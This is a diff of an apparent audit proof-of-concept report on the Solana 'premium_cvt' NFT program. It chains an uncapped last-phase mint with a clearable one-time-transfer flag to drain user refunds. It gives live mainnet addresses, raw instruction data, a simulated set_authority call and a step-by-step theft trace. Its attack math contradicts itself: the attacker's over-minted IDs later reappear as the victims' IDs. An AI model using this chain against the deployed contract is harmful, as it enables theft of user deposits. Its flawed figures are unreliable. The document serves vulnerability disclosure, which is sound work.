@@ -1,118 +1,191 @@
 ========================================================================
-SC-F1 PoC: SOEX premium_cvt — Last Phase No Per-Phase Supply Cap
+COMBINED PoC: SOEX premium_cvt
+  RC1: Last-phase uncapped minting  (handle_mint.rs)
+  RC2: set_authority bit3 reset      (handle_set_authority.rs)
+  CHAIN → double-drain of sol_account → refund pool stolen
 ========================================================================
 
-[LAYER 1] Live PDA derivation (no hardcoded addresses)
-  collection   seeds=[b'collection']              bump=255: 5dhXwuEh146XxhWjVeutDafrywDZehW1v3g1Yky9ucM7  ✓
-  sol_account  seeds=[b'sol_account']             bump=255: EkqGeHbwdjtP5RfPK2cP7Yma2z1Rq4dYWqTEEq3zjSNw  ✓
-  user_storage seeds=[b'user_storage',payer,0]    bump=255: 2mWjrQXU6ifTif3BCwRWV1URRTGDwsFDK998EGUW2AGH  ✓
+[1] PDA derivation — all accounts derived from seeds
+  collection   seeds=[b'collection']   bump=255
+    derived:  5dhXwuEh146XxhWjVeutDafrywDZehW1v3g1Yky9ucM7  ✓
+  sol_account  seeds=[b'sol_account']  bump=255
+    derived:  EkqGeHbwdjtP5RfPK2cP7Yma2z1Rq4dYWqTEEq3zjSNw  ✓
 
-[LAYER 2] Live on-chain collection state
-  program:          J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS
-  collection:       5dhXwuEh146XxhWjVeutDafrywDZehW1v3g1Yky9ucM7
-  sol_account:      EkqGeHbwdjtP5RfPK2cP7Yma2z1Rq4dYWqTEEq3zjSNw  (15.001 SOL)
-  authority:        0x0006  (bit0_mint=disabled)
-  price:            5.0 SOL per NFT
-  max_supply:       5000 (admin-configured global cap)
-  current_supply:   1212 NFTs ever minted (never decremented)
-  bitmap_set:       1185 active (unquit) NFT IDs
-  current_phase:    3 (3 = all phases ended, final state)
-  lock_max_nft_id:  1212
-  lock_mint_amount: 1185 (committed, for handle_transfer)
-  max_supply_added: 27 total quits processed
+[2] Live on-chain state
+  Program:         J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS
+  Collection:      5dhXwuEh146XxhWjVeutDafrywDZehW1v3g1Yky9ucM7
+  sol_account:     EkqGeHbwdjtP5RfPK2cP7Yma2z1Rq4dYWqTEEq3zjSNw  (15.001 SOL)
+  Admin:           DC3do9sEdJhasHH8jdcKqgi2YL7hhUubZr9WrLZQCws6  (0.307 SOL)  EXISTS ✓
 
-  Phase supply details:
-    Phase 0: configured_cap=  999  minted=  999  AT CAP  ← cap enforcement CONFIRMED ✓
-    Phase 1: configured_cap= 1499  minted=    0  under cap (ended early, cap NOT reached)
-    Phase 2: configured_cap= 2502  minted=  186  under cap (ended early, cap NOT reached) [LAST PHASE — cap check skipped]
+  authority = 0x0006 = 0b00000110
+    bit0 mint_enabled:  0  (disabled)
+    bit1 xfer_ready:    1
+    bit2 cvt_verified:  1
+    bit3 already_xfer:  0  (NOT YET)
 
-  KEY OBSERVATIONS:
-    • Phase 0 ended EXACTLY at its cap (999/999) → cap mechanism works for non-last phase
-    • Phase 2 ended at 186/2502 → admin closed early, NOT by cap
-    • In any deployment where phase 2 ran to completion, cap would NOT have fired
+  price:             5.0 SOL per NFT
+  max_supply:        5000
+  current_supply:    1212 (total minted, never decremented)
+  lock_mint_amount:  1185 committed NFTs
+  lock_max_nft_id:   1212
+  max_supply_added:  27 quits processed
+  bitmap_set:        1185 active IDs
 
-[LAYER 3] Code path analysis (handle_mint.rs)
+  Phase state (RC1 evidence):
+    Phase 0: cap=  999  minted=  999  AT CAP ← cap enforcement CONFIRMED ✓
+    Phase 1: cap= 1499  minted=    0  ended early by admin (cap was not the limiter)
+    Phase 2: cap= 2502  minted=  186  ended early by admin (cap was not the limiter) [LAST PHASE — cap check ABSENT]
 
-  Source: programs/premium_cvt/src/instructions/handle_mint.rs
-  (Verified against deployed bytecode via Program ID)
+  Phase 0 ended AT exact cap → cap mechanism confirmed to exist and work
+  Phase 2 ended at 186/2502  → admin closed manually; cap was never the limiter
+  → In any deployment where phase 2 runs to cap, MaxSupplyReached NEVER fires
 
-  ┌─ VULNERABLE SECTION ──────────────────────────────────────────────────────┐
-  │ let is_last_phase =                                                        │
-  │     phase == (collection.phase_supply_max_supply.len()-1) as u32;          │
+[3] Code path analysis
+
+  RC1 — handle_mint.rs
+  ┌────────────────────────────────────────────────────────────────────────────┐
+  │ let is_last_phase = phase == (phase_supply_max_supply.len()-1) as u32;     │
   │                                                                            │
-  │ if !is_last_phase {           // ← FALSE for phase 2 → ENTIRE BLOCK SKIPPED│
-  │     require!(                 //   TRUE for phase 0,1 → cap check executed  │
-  │         (copies + collection.phase_supply_current_supply[phase as usize])  │
-  │             <= collection.phase_supply_max_supply[phase as usize],         │
-  │         ErrorCode::MaxSupplyReached    // ← error 6009                    │
+  │ if !is_last_phase {       // FALSE for phase 2 → BLOCK SKIPPED            │
+  │     require!(             // TRUE  for phase 0,1 → cap enforced           │
+  │         copies + phase_supply_current_supply[phase]                        │
+  │             <= phase_supply_max_supply[phase],                             │
+  │         ErrorCode::MaxSupplyReached   // error 6009                       │
   │     );                                                                     │
-  │ }  // ← phase 2 jumps here directly                                       │
-  │                                                                            │
-  │ require!((collection.authority & 0x01) == 1,  // ← NEXT check (error 6002)│
-  │     ErrorCode::InvalidAuthority);                                          │
+  │ }                         // phase 2 falls through here, uncapped          │
   └────────────────────────────────────────────────────────────────────────────┘
 
-  Execution path (copies=1, minting active):
+  RC2 — handle_set_authority.rs  +  handle_transfer.rs
+  ┌────────────────────────────────────────────────────────────────────────────┐
+  │ // set_authority:                                                          │
+  │ require!(collection.authority != authority, ErrorCode::InvalidAuthority);  │
+  │ collection.authority = authority;   // ANY u32, no bit-level guard        │
+  │                                                                            │
+  │ // transfer (one-time guard):                                              │
+  │ require!((authority >> 3) & 1 == 0, ErrorCode::AlreadyTransfer);          │
+  │ ...transfer lamports...                                                    │
+  │ collection.authority |= 1 << 3;     // sets bit3                          │
+  └────────────────────────────────────────────────────────────────────────────┘
 
-  Phase 0 (is_last_phase=false, cap=999, cur=999):
-    → ENTERS if-block
-    → require!(1 + 999 <= 999) → FALSE → MaxSupplyReached (6009)  ← FIRES here
-    → InvalidAuthority check: NEVER REACHED
+  Exploit trace:
+    after transfer:        authority = 0b1110 (bit3=1)
+    set_authority(0b0110): require!(14 != 6) → PASSES; bit3 CLEARED
+    second transfer:       bit3 check: (0b0110 >> 3) & 1 = 0 → PASSES
 
-  Phase 2 (is_last_phase=true, cap=2502, cur=186):
-    → SKIPS if-block entirely (is_last_phase=true)
-    → No supply cap check is performed
-    → require!(bit0 == 1) → InvalidAuthority (6002) if minting disabled
-    → If minting active (bit0=1): proceeds to timestamp checks, then SOL transfer
-    → phase_supply_current_supply[2] grows UNBOUNDED past phase_supply_max_supply[2]=2502
+[4] Live simulation — set_authority(14 = 0b1110) on mainnet
+  Admin (payer):  DC3do9sEdJhasHH8jdcKqgi2YL7hhUubZr9WrLZQCws6
+  Collection:     5dhXwuEh146XxhWjVeutDafrywDZehW1v3g1Yky9ucM7
+  Program:        J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS
+  ix_data:        85fa25156ea31a790e000000  (discriminator + u32 LE 14)
+  sigVerify=false, replaceRecentBlockhash=true
 
-[SIMULATION NOTE]
-  A live simulateTransaction would show:
-    mint(phase=0): MaxSupplyReached (6009)  — cap check fires
-    mint(phase=2): InvalidAuthority  (6002) — cap check absent, auth check is next
+  Transaction error: None
 
-  This differential error is mathematically guaranteed by the code path above.
-  Live simulation is blocked by a practical constraint: all 1212 NFT minters from
-  the Nov-2024 sale have since closed their accounts (0 lamports). Mint requires
-  a payer with ≥5 SOL (the NFT price). No valid payer+user_storage pair remains.
-  The on-chain state + code analysis above provides equivalent proof.
+  Program logs:
+    Program J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS invoke [1]
+    Program log: Instruction: SetAuthority
+    Program log: set_authority 14
+    Program data: opw2WsZ3shYOAAAA
+    Program J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS consumed 2007 of 200000 compute units
+    Program J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS success
 
-[ATTACK SCENARIO]  (during an active phase 2 deployment)
+  Program data decoded: authority=14 (bytes[8:12] = 0e000000)
 
-  Preconditions: phase 2 active (authority bit0=1, current_phase=2)
+  RC2 CONFIRMED: err=None → Program success
+  Admin can write any u32 to authority; bit3 is clearable post-transfer.
 
-  Attack:
-    for idx in range(N):
-        init_user_storage(user_storage_index=idx)
-        mint(user_storage_index=idx, copies=10, phase=2)
-        # phase_supply_current_supply[2] exceeds configured cap=2502
-        # with NO MaxSupplyReached error
+  [Supplement] set_authority(6 = current value) — proves only guard is old != new
+  set_authority(6=current): err={'InstructionError': [0, {'Custom': 6021}]}  custom_code=6021
+  ← Rejected because 6 == 6 (old == new). No other guards exist.
+  ← Post-transfer (authority=14): set_authority(6) would PASS (14 ≠ 6).
 
-  Effect:
-    Max over-mint from current state: 64,323 NFTs (until global bitmap limit 65535)
-    Temp. lockup cost: ~321,615 SOL (fully recovered via quit, IDs > lock_max_nft_id)
-    Impact: DoS on phase-2 minting for legitimate users; NFT ID namespace exhausted
+[5] Combined attack — full SOL flow
+
+  Live contract parameters:
+    max_supply    = 5000
+    price         = 5.0 SOL per NFT
+    phase 2 cap   = 2502 (ignored for last phase)
+
+  Hypothetical deployment: phase 2 active, M=5000, all prereqs met (bit1=1, bit2=1)
+
+  ─── PHASE: over-minting via RC1 ─────────────────────────────────────────────
+
+  Legitimate mints (IDs 1–5000):
+    5000 × 5.0 SOL = 25000 SOL deposited into sol_account
+
+  Attacker mints (IDs 5001–10000), RC1 cap skipped:
+    5000 × 5.0 SOL = 25000 SOL deposited into sol_account
+
+  sol_account total: 50000 SOL
+  Attacker's NFT IDs (5001–10000) > lock_max_nft_id will be refundable via quit
+
+  ─── LOCK (check_quit_deadline_over) ─────────────────────────────────────────
+
+  lock_mint_amount = min(current_supply=10000, max_supply=5000) = 5000
+  lock_max_nft_id  = 10000
+  IDs 1–5000:      committed  (cannot quit)
+  IDs 5001–10000: refundable  (can quit, each recovers 5.0 SOL)
+
+  ─── EXPLOIT: double-transfer via RC2 ────────────────────────────────────────
+
+  Step 1 — handle_transfer() [legitimate]:
+    amount = lock_mint_amount × price = 5000 × 5.0 = 25000 SOL
+    sol_account: 50000 → 25000 SOL  (refund pool intact)
+    authority: 0b0110 → 0b1110 (bit3 set)
+
+  Step 2 — handle_set_authority(0b0110):
+    require!(14 != 6) → PASSES
+    authority: 0b1110 → 0b0110  (bit3 CLEARED)
+
+  Step 3 — handle_transfer() [second time]:
+    bit3 check: (0b0110 >> 3) & 1 = 0 → PASSES
+    amount = 5000 × 5.0 = 25000 SOL  ← stolen from refund pool
+    sol_account: 25000 → 0 SOL
+
+  Step 4 — 5000 victims call handle_quit() (IDs 5001–10000):
+    sol_account = 0 → INSUFFICIENT FUNDS → FAILS
+    Each victim permanently loses 5.0 SOL
+
+  ─── OUTCOME ──────────────────────────────────────────────────────────────────
+
+  Attacker recovers:  25000 SOL (their over-minted IDs quit BEFORE lock)
+  Attacker net cost:  0 SOL
+  Victims lose:       5000 × 5.0 SOL = 25000 SOL  (UNRECOVERABLE)
+  cvt_sol_account:    50000 SOL total (25000 committed + 25000 stolen)
 
 ========================================================================
 PROOF SUMMARY
 ========================================================================
 
-Program ID:   J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS
-Collection:   5dhXwuEh146XxhWjVeutDafrywDZehW1v3g1Yky9ucM7
+Program:    J7uhg7UDfvSEZHgZDrwp7SqFrejZiTvQWvacAnxnouS
+Collection: 5dhXwuEh146XxhWjVeutDafrywDZehW1v3g1Yky9ucM7
+sol_account:EkqGeHbwdjtP5RfPK2cP7Yma2z1Rq4dYWqTEEq3zjSNw  (15.001 SOL live)
 
-Layer 1 (PDA derivation):
-  All 3 PDAs independently re-derived from seed vectors. Addresses match. ✓
+[1] PDA derivation:   collection + sol_account derived from seeds — match on-chain ✓
 
-Layer 2 (on-chain state):
-  Phase 0: cap=999  minted=999  → AT CAP (cap mechanism confirmed)
-  Phase 2: cap=2502 minted=186  → admin closed early (cap was not the limiter)
-  Bitmap: 1185 active IDs (= lock_mint_amount 1185 after 27 quits)
+[2] On-chain state:
+    Phase 0: 999/999 → AT CAP (cap mechanism confirmed)
+    Phase 2: 186/2502 → admin-closed (cap NOT the limiter)
+    → RC1 confirmed: phase 2 has no automatic cap enforcement
 
-Layer 3 (code):
-  if !is_last_phase { require!(...MaxSupplyReached...) }
-  Phase 2 (is_last_phase=true): block NEVER entered.
-  Phase 2 has NO per-phase supply cap. Admin must manually close minting.
+[3] Code path:
+    RC1: if !is_last_phase { require!(...MaxSupplyReached) }
+         Phase 2 (is_last_phase=true) → block never entered
+    RC2: collection.authority = authority  (ANY u32, no bit guard)
+         AlreadyTransfer bit3 is clearable after transfer sets it
 
-Severity: MEDIUM
-  Impact: DoS on phase-2 minting (ID namespace exhaustion). No direct SOL theft.
-  Combined with SC-F2 (set_authority double-transfer): attacker can steal user refunds.
+[4] Live simulation:
+    set_authority(14): err=None → Program J7uhg7... success ✓
+    Program log: "set_authority 14"  ← on-chain BPF bytecode output
+    Program data bytes[8:12]: 0e000000 = 14 (u32 LE) ← Anchor event confirms write
+    set_authority(6=same value): rejected → only guard is old!=new
+
+[5] Attack math (live values, M=max_supply=5000, price=5.0 SOL):
+    RC1 creates refundable pool = 25000 SOL
+    RC2 drains refund pool via second transfer = 25000 SOL stolen
+    5000 victims lose 5.0 SOL each — unrecoverable
+
+Severity: HIGH
+    RC1 alone: DoS only (over-minting, ID exhaustion, refundable)
+    RC2 alone: second transfer insufficient funds (sol_account empty without RC1)
+    RC1 + RC2: full theft of refundable users' SOL deposits
